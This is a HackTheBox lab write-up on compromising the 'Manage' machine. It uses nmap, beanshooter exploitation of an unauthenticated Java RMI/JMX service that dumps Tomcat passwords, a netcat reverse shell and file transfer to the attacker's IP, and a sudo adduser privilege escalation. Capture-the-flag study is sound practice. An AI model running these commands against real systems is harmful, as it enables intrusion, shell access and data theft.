---
title: Manage - Java RMI misconfigured
date: 2025-12-15 00:00:00 +0000
categories: [HackTheBox Writeups, Linux]
tags: [hackthebox, linux]
---


```
ares@legion:~/HackTheBox/Manage$ sudo nmap -sVC -A -T4 $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 12:21 EST
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.12% done; ETC: 12:22 (0:00:00 remaining)
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.59% done; ETC: 12:22 (0:00:00 remaining)
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.83% done; ETC: 12:22 (0:00:00 remaining)
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.83% done; ETC: 12:22 (0:00:00 remaining)
Nmap scan report for 10.129.234.57 (10.129.234.57)
Host is up (0.049s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp open  java-rmi Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:37837
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http     Apache Tomcat 10.1.19
|_http-title: Apache Tomcat/10.1.19
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   52.86 ms 10.10.14.1 (10.10.14.1)
2   52.96 ms 10.129.234.57 (10.129.234.57)

OS and Service detection performed. Please report any incorrect results at https://nmap.o
Nmap done: 1 IP address (1 host up) scanned in 49.49 seconds
```
https://github.com/qtc-de/beanshooter

```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222  
```
![[Pasted image 20251122200710.png]]
![[Pasted image 20251122200725.png]]
```
[+]     - Listing 2 tomcat users:
[+]
[+]             ----------------------------------------
[+]             Username:  manager
[+]             Password:  fhErvo2r9wuTEYiYgt
[+]             Roles:
[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+]             ----------------------------------------
[+]             Username:  admin
[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
[+]             Roles:
[+]                        Users:type=Role,rolename="role1",database=UserDatabase
```

Payload // No authentification:
```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka
```
![[Pasted image 20251122200833.png]]

Now we can trigger a shell:
```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
```
![[Pasted image 20251122201639.png]]
OR
```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard exec 'nc 10.10.14.97 1234 -e ash' 
```

```
nc -lvp 1234 > backup.tar.gz

[tomcat@10.129.234.57 /home/useradmin/backups]$ nc 10.10.14.97 1234 < backup.tar.gz

tar -xvzf backup.tar.gz
```
![[Pasted image 20251122202241.png]]


Privesc:
```
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$

useradmin@manage:~$ sudo /usr/sbin/adduser admin
```
![[Pasted image 20251122202955.png]]
